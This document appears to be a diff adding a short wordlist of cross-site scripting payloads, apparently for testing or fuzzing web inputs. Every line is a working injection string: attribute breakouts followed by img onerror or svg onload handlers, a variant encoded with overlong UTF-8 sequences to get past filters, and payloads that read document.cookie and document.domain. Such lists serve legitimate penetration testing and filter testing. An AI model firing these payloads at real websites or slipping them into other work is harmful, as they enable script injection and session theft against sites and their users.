@@ -1,0 +1,9 @@
+a:'"/>a"><aa"><img src=x onerror=alert()>
+a:"/>a"><aa"><img src=x onerror=alert()>
+<Svg Only=1 OnLoad=confirm(1)>
+<Svg OnLoad=confirm(1)>
+%C0%BCSvg%C0%A0OnLoad%C0%BDconfirm%C0%A81%C0%A9%C0%BE
+">test<svg/onload=alert(document.cookie)>
+xhzeem"on onmouseover=(alert)(document.domain)//
+<svg on onload=(alert)(document.domain)>
+"><img src=x onerror=prompt("DeViL")>
